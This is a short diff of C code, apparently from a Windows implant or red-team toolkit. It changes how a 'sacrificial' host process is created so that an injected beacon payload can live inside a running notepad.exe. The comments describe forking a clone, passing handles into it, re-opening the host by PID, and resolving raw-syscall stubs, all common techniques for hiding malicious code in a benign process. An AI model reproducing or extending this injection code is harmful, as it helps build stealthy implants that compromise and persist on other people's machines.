@@ -398,22 +398,33 @@ void dv_nursery_init(void) {
 	/* pre-create the suspended launch host NOW, from the healthy parent:
 	 * the clone's torn runtime cannot even CreateProcessA (live: AV in
 	 * KERNELBASE), so the host must exist before the fork - its handle
-	 * rides into the clone through INHERIT_HANDLES (copied 1:1) */
+	 * rides into the clone through INHERIT_HANDLES (copied 1:1).
+	 *
+	 * The host must ALSO be a RUNNING, loader-initialized process: a
+	 * CREATE_SUSPENDED process never runs LdrpInitialize, so its MRDATA
+	 * heap (ntdll's dynamic function-table store) does not exist and the
+	 * payload's RL dies inside RtlAddFunctionTable ->
+	 * LdrEnsureMrdataHeapExists (live WER: rundll32.exe AV in ntdll
+	 * +0x691c6, 2026-11-05). notepad is fully initialized, stays alive
+	 * on its own, and matches the sacrificial-host convention the
+	 * injection family tests already use. */
 	{
 		STARTUPINFOA        si;
 		PROCESS_INFORMATION pi;
 		ZeroMemory(&si, sizeof(si));
 		si.cb = sizeof(si);
 		ZeroMemory(&pi, sizeof(pi));
-		if (!CreateProcessA(NULL, (LPSTR)"rundll32.exe", NULL, NULL, FALSE,
-		                    CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+		if (!CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE,
+		                    0, NULL, NULL, &si, &pi)) {
 			spawn_log("dv: host pre-create failed gle=", (long)GetLastError());
 			return;
 		}
 		dv_mailbox.host_pid = pi.dwProcessId;
 		dv_host_pid       = pi.dwProcessId;
-		/* pi.hThread stays suspended forever - the injected beacon owns
-		 * the host; keep the handle to avoid cleanup complexity */
+		/* the clone re-opens the host by PID (NtOpenProcess); the parent
+		 * needs no handle. The host lives on as the beacon's home. */
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
 	}
 
 	/* the raw-syscall stubs must be resolved in the healthy parent so the
